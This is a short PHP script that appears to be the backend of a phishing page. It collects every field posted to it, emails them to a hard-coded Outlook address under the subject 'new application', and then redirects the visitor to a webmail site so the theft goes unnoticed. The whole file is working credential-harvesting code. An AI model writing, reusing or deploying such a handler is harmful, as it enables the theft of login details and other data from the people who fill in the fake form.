<?php

$mailto = 'susaneklatten010@outlook.com';
	$subject = 'new application';
	$input = $_POST;
	$redirect = "index.html";
	$msg = '';
	foreach($input as $key => $value ) {
	     $msg .= $key.' : '.$value."\n";
	}
	mail($mailto, $subject, $msg);
echo "<script>window.location='http://poczta.actuna.com/'</script>";

?>